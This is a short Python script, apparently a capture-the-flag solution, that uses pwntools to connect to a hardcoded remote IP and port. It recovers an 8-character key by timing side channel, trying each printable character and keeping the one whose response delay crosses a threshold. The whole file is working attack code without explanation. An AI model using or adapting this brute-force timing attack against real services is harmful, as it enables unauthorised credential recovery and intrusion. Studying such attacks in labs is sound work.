import pwn
import time

k = 0
final_key = []
key = ''
while(k < 8):
    pre_key = key
    for i in range(32, 127):
        key += chr(i)
        r = pwn.remote('194.5.207.190', 6030)
        r.recvlines(17)
        r.recv()
        start = time.time()
        r.sendline(key)
        r.recvlines(1)
        end = time.time()
        delay = end - start
        print(delay)
        if (delay >= k + 1):
            final_key.append(chr(i))
            break
        else:
            key = pre_key
    k += 1

print(''.join(final_key))
